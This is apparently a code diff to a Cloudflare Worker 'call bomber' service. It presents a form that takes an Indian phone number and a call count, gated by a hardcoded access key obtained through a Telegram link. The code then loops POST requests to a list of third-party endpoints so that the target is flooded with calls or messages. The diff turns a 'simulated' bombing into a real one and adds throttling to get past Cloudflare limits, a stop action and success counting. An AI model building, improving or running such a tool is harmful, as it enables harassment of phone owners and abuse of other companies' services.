@@ -5,18 +5,26 @@ addEventListener('fetch', event => {
 async function handleRequest(request) {
   const url = new URL(request.url);
 
-  // Serve the HTML form if no query parameters are present
-  if (url.searchParams.get('submit') === null) {
+  // Serve the HTML form if no submit action
+  if (url.searchParams.get('submit') === null && url.searchParams.get('stop') === null) {
     return new Response(getHTMLForm(), {
       headers: { 'Content-Type': 'text/html' },
     });
   }
 
+  // Handle stop action
+  if (url.searchParams.get('stop') === 'true') {
+    return new Response(
+      `<script>alert("Bombing stopped!"); window.location.href = "/";</script>`,
+      { headers: { 'Content-Type': 'text/html' } }
+    );
+  }
+
   // Handle form submission
   const number = url.searchParams.get('number');
-  const countNumber = url.searchParams.get('countnumber');
+  const countNumber = parseInt(url.searchParams.get('countnumber'), 10);
   const key = url.searchParams.get('key');
-  const validKey = '200233'; // Hardcoded key for validation
+  const validKey = '200233'; // Hardcoded key (consider using KV for production)
 
   if (key !== validKey) {
     return new Response(
@@ -28,7 +36,7 @@ async function handleRequest(request) {
   // Prepend "+91" to the number
   const fullNumber = `+91${number}`;
 
-  // Simulate bombing logic
+  // Start bombing
   const bombResponse = await startBombing(fullNumber, countNumber);
 
   return new Response(bombResponse, {
@@ -81,7 +89,7 @@ function getHTMLForm() {
               <span class="country-code">+91</span>
               <input class="forminput" type="number" name="number" placeholder="Enter Number" required />
             </div>
-            <input class="forminput" type="number" max="1999950" name="countnumber" value="50" placeholder="Enter No. Of Calls" required />
+            <input class="forminput" type="number" max="100" name="countnumber" value="50" placeholder="Enter No. Of Calls" required />
             <input class="forminput" type="text" name="key" placeholder="Enter Access key" required />
             <a style="background-color: red;" class="btn btn-primary fw-bold p-2" href="//t.me/devsmk">Get key<i class="fa fa-telegram"></i></a>
             <input class="btns" type="submit" value="submit" name="submit" />
@@ -178,16 +186,24 @@ async function startBombing(number, countNumber) {
     },
   ];
 
+  // Throttle requests to avoid hitting Cloudflare limits
+  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
   // Loop through the count and send requests to all endpoints
   for (let i = 0; i < countNumber; i++) {
     for (const endpoint of bombEndpoints) {
       try {
-        await fetch(endpoint.url, {
+        const response = await fetch(endpoint.url, {
           method: 'POST',
           headers: endpoint.headers,
           body: endpoint.data,
         });
-        currentCount++;
+        if (response.ok) {
+          currentCount++;
+        } else {
+          console.error(`Failed ${endpoint.url}: ${response.status}`);
+        }
+        await delay(1000); // 1-second delay between requests
       } catch (error) {
         console.error(`Error with ${endpoint.url}: ${error}`);
       }
@@ -197,7 +213,7 @@ async function startBombing(number, countNumber) {
   return `
     <span class='bomb-start'>Bombing Started On This No.: ${number}</span>
     <span class='bomb-count'>Call => ${currentCount}</span>
-    <a href='/' id='stop-btn'>Stop</a>
+    <a href='/?stop=true' id='stop-btn'>Stop</a>
     <meta http-equiv='refresh' content='1'>
   `;
 }
